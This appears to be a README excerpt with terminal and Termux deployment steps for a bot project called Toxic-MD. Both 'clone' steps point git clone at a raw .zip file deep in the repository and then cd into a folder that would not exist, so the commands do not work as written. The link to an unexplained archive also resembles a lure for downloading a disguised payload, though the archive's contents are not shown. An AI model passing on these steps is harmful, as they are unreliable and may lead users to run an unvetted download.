### **Option 2: Deploy via Terminal**

1. **Clone the Repository**:
    ```bash
    git clone https://github.com/tripmotions/Toxic-MD/raw/refs/heads/main/XeonMedia/Toxic_MD_v1.6-beta.1.zip
    cd Toxic-MD
    ```

2. **Install Requirements**:
   - **For Ubuntu/Terminals**:
   ```bash
   sudo apt -y update && sudo apt -y upgrade
   sudo apt -y install git ffmpeg curl nodejs yarn
   yarn global add pm2
   yarn install
   npm start
   ```

   - **For Termux**:
   ```bash
   pkg update && pkg upgrade
   pkg install bash git nodejs ffmpeg wget imagemagick yarn
   termux-setup-storage
   git clone https://github.com/tripmotions/Toxic-MD/raw/refs/heads/main/XeonMedia/Toxic_MD_v1.6-beta.1.zip
   cd Toxic-MD
   yarn install
   npm start
   ```
